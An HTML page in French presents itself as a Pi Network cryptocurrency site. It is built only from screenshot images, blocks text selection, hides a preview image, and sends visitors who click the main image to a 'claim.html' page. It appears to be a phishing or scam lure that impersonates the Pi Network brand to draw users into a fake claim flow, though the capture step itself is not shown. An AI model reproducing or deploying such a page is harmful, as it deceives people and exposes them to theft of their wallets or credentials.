<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pi Network - La Cryptomonnaie Accessible</title>
    
    <!-- Balises Open Graph avec CDN d'images -->
    <meta property="og:title" content="Pi Network - Rejoignez la Révolution Crypto">
    <meta property="og:description" content="Découvrez Pi Network, la première cryptomonnaie que vous pouvez miner sur votre téléphone">
    <meta property="og:image" content="https://i.imgur.com/YOUR_IMAGE_ID.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://votresite.com">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Pi Network">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            min-height: 100vh;
            touch-action: pan-x pan-y;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            overflow-x: hidden;
        }
        
        .main-image, .continuation-image {
            width: 100%;
            height: auto;
            display: block;
            vertical-align: bottom;
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: 10;
        }
        
        .footer img {
            width: 100%;
            height: auto;
            display: block;
        }
        
        /* Masquage complet de l'image d'aperçu */
        .og-image {
            display: none !important;
        }
    </style>
</head>
<body>
    <!-- Image OG masquée -->
    <img class="og-image" 
         src="https://i.postimg.cc/ZnC34MXR/Go-1.png" 
         alt="Pi Network Preview">
    
    <!-- Contenu principal -->
    <img class="main-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
         alt="Image principale" 
         onclick="window.location.href='claim.html'">
    
    <img class="continuation-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
         alt="Suite de l'image">
    
    <footer class="footer">
        <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
             alt="Pied de page">
    </footer>
</body>
</html>
